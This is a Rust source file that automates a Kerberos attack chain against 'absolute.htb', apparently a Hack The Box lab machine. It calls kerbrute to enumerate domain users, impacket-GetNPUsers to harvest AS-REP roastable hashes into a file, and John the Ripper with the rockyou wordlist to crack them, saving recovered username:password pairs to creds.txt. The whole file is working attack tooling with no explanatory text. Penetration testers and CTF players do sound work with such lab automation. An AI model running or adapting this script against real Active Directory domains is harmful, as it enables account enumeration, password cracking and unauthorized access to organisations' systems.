use std::process::Command;
use std::fs::File;
use std::io::{Write, stdin};

pub fn run_kerbrute() {
    // Prepare the kerbrute command with the specified arguments
    let output = Command::new("kerbrute")
        .arg("userenum")
        .arg("usernames_final.txt")
        .arg("-d")
        .arg("absolute.htb")
        .arg("--dc")
        .arg("dc.absolute.htb")
        .output()
        .expect("failed to execute kerbrute");

    // Print the command output to the console
    println!("{}", String::from_utf8_lossy(&output.stdout));
    println!("{}", String::from_utf8_lossy(&output.stderr));
}

pub fn run_impacket_getnpusers() {
    // Prepare the impacket-GetNPUsers command with the specified arguments
    let output = Command::new("impacket-GetNPUsers")
        .arg("absolute.htb/")
        .arg("-dc-ip")
        .arg("dc.absolute.htb")
        .arg("-usersfile")
        .arg("usernames_final.txt")
        .output()
        .expect("failed to execute impacket-GetNPUsers");

    // Convert the command output to a string
    let output_str = String::from_utf8_lossy(&output.stdout);

    // Find the line containing the $krb5asrep$ string
    let hash_line = output_str.lines()
        .find(|line| line.starts_with("$krb5asrep$"))
        .expect("Hash not found");

    // Create a new file called hash
    let mut hash_file = File::create("hash").expect("Unable to create file");

    // Write the hash line to the hash file
    writeln!(&mut hash_file, "{}", hash_line).expect("Unable to write data to file");
}

pub fn run_john() {
    // Ask the user for the file path to rockyou.txt
    println!("Please enter the file path to rockyou.txt \nInclude /rockyou.txt in your path \nStart path with /:");

    let mut rockyou_path = String::new();
    stdin()
        .read_line(&mut rockyou_path)
        .expect("Failed to read input");

    // Remove the trailing newline character
    rockyou_path = rockyou_path.trim().to_string();

    // Prepare the john command with the specified arguments
    let output = Command::new("john")
        .arg(format!("-w:{}", rockyou_path))
        .arg("hash")
        .output()
        .expect("failed to execute john");

    // Run john --show to get a more readable output
    let show_output = Command::new("john")
        .arg("--show")
        .arg("hash")
        .output()
        .expect("failed to execute john --show");

    // Convert the output to a string
    let output_str = String::from_utf8_lossy(&show_output.stdout);

    // Create a new file called creds.txt
    let mut creds_file = File::create("creds.txt").expect("Unable to create file");

    // Iterate through the output lines
    for line in output_str.lines() {
        let parts: Vec<&str> = line.split(':').collect();

        // If there are two parts (username and password), format and write the line to creds.txt
        if parts.len() == 2 {
            let username = parts[0];
            let password = parts[1];
            writeln!(&mut creds_file, "{}:{}", username, password).expect("Unable to write data to file");
        }
    }
}